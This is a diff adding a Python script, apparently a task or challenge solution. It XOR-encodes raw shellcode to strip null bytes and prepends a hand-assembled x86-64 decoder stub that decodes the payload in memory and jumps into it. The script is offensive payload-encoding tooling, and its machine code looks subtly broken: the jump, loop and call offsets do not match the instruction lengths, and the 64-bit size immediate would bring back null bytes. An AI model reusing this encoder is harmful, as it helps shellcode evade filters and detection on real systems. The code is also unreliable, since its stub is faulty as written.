@@ -1,0 +1,125 @@
+#!/usr/bin/env python3
+import os
+import json
+
+def xor_encode(data, key):
+    """XOR encode the shellcode with a single-byte key"""
+    encoded = bytearray()
+    for byte in data:
+        encoded_byte = byte ^ key
+        encoded.append(encoded_byte)
+    return bytes(encoded)
+
+def find_best_xor_key(data):
+    """Find XOR key that avoids null bytes in encoded output"""
+    for key in range(1, 256):
+        encoded = xor_encode(data, key)
+        if 0x00 not in encoded:
+            return key
+    return None
+
+def create_decoder_stub(key, shellcode_size):
+    """
+    Create x86-64 decoder stub that:
+    1. Gets its own address (position-independent)
+    2. XOR decodes the shellcode in place
+    3. Jumps to decoded shellcode
+    """
+    decoder = bytearray()
+    
+    # eb 0b                 jmp short get_address
+    decoder.extend([0xeb, 0x0b])
+    
+    # decoder_start:
+    # 5e                    pop rsi              ; RSI = address after call
+    decoder.append(0x5e)
+    
+    # 48 31 c9              xor rcx, rcx         ; counter = 0
+    decoder.extend([0x48, 0x31, 0xc9])
+    
+    # 48 b9 [size]          mov rcx, size        ; shellcode size
+    decoder.extend([0x48, 0xb9])
+    decoder.extend(shellcode_size.to_bytes(8, 'little'))
+    
+    # decode_loop:
+    # 80 36 [key]           xor byte [rsi], key
+    decoder.extend([0x80, 0x36, key])
+    
+    # 48 ff c6              inc rsi
+    decoder.extend([0x48, 0xff, 0xc6])
+    
+    # 48 ff c9              dec rcx
+    decoder.extend([0x48, 0xff, 0xc9])
+    
+    # 75 f4                 jnz decode_loop
+    decoder.extend([0x75, 0xf4])
+    
+    # ff e6                 jmp rsi              ; jump to decoded shellcode
+    decoder.extend([0xff, 0xe6])
+    
+    # get_address:
+    # e8 f0 ff ff ff        call decoder_start
+    decoder.extend([0xe8, 0xf0, 0xff, 0xff, 0xff])
+    
+    return bytes(decoder)
+
+def main():
+    # Read raw shellcode
+    raw_shellcode_path = '/workspace/raw_shellcode.bin'
+    
+    with open(raw_shellcode_path, 'rb') as f:
+        raw_shellcode = f.read()
+    
+    original_size = len(raw_shellcode)
+    
+    # Find suitable XOR key
+    xor_key = find_best_xor_key(raw_shellcode)
+    
+    if xor_key is None:
+        raise ValueError("Could not find suitable XOR key to avoid null bytes")
+    
+    # Encode shellcode
+    encoded_shellcode = xor_encode(raw_shellcode, xor_key)
+    
+    # Create decoder stub
+    decoder = create_decoder_stub(xor_key, original_size)
+    decoder_size = len(decoder)
+    
+    # Combine decoder and encoded shellcode
+    final_payload = decoder + encoded_shellcode
+    encoded_size = len(final_payload)
+    
+    # Verify size constraint (150% of original)
+    max_allowed_size = int(original_size * 1.5)
+    if encoded_size > max_allowed_size:
+        raise ValueError(f"Encoded size {encoded_size} exceeds 150% of original {original_size}")
+    
+    # Verify no null bytes in final payload
+    if 0x00 in final_payload:
+        raise ValueError("Final payload contains null bytes")
+    
+    # Write encoded payload
+    output_path = '/workspace/encoded_payload.bin'
+    with open(output_path, 'wb') as f:
+        f.write(final_payload)
+    
+    # Write solution JSON
+    solution = {
+        "original_size": original_size,
+        "encoded_size": encoded_size,
+        "decoder_size": decoder_size
+    }
+    
+    solution_path = '/workspace/solution.json'
+    with open(solution_path, 'w') as f:
+        json.dump(solution, f, indent=2)
+    
+    print(f"Successfully encoded shellcode:")
+    print(f"  Original size: {original_size} bytes")
+    print(f"  Decoder size: {decoder_size} bytes")
+    print(f"  Encoded size: {encoded_size} bytes")
+    print(f"  XOR key: 0x{xor_key:02x}")
+    print(f"  Size ratio: {(encoded_size/original_size)*100:.1f}%")
+
+if __name__ == '__main__':
+    main()
